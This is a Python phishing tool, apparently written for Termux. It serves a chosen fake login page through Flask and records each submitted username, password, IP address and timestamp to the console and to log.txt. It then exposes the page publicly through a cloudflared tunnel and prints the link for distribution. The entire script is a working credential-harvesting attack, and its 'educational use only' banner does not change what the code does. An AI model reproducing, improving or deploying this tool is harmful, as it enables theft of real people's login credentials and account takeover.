import os, subprocess
from flask import Flask, request, send_from_directory
from datetime import datetime

# -------- Auto Install --------
try:
    import flask
except ImportError:
    os.system("pip install flask")

if os.system("command -v cloudflared > /dev/null") != 0:
    os.system("pkg install cloudflared -y")

# -------- Colors --------
red='\033[1;31m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
reset='\033[0m'

# -------- Banner --------
def banner():
    print(f"""{red}
██████╗ ██████╗  ██████╗     ██████╗ 
██╔══██╗██╔══██╗██╔═══██╗    ╚════██╗
██████╔╝██████╔╝██║   ██║     █████╔╝
██╔═══╝ ██╔═══╝ ██║   ██║    ██╔═══╝ 
██║     ██║     ╚██████╔╝    ███████╗
╚═╝     ╚═╝      ╚═════╝     ╚══════╝
{reset}{cyan}              PRO D{reset}
{grn}          Created by Dhani{reset}
{red}========================================={reset}
{ylo}   This tool is for educational use only{reset}
{red}========================================={reset}
""")

# -------- Flask App --------
app = Flask(__name__)

@app.route('/')
def home():
    return send_from_directory(".", selected_html)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    ip = request.remote_addr
    t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_entry = f"""
[NEW LOGIN]
Username: {username}
Password: {password}
Time: {t}
IP: {ip}
---------------------------
"""
    print(grn + log_entry + reset)
    with open("log.txt", "a") as f:
        f.write(log_entry)

    return "<h2>Thanks!</h2><p>Login saved.</p>"

# -------- Main --------
if __name__ == "__main__":
    banner()
    print(f"{cyan}[1] Fake Login 1{reset}")
    print(f"{pink}[2] Fake Login 2{reset}\n")

    choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
    selected_html = "1.html" if choice == "1" else "2.html"

    print(f"\n{grn}[INFO] Local server running on http://127.0.0.1:8080{reset}\n")

    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://127.0.0.1:8080"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )

    # Grab the public link
    for line in process.stdout:
        if "trycloudflare.com" in line:
            print(f"\n{red}[PUBLIC LINK]{reset} {cyan}{line.strip()}{reset}\n")
            break

    app.run(host="0.0.0.0", port=8080)
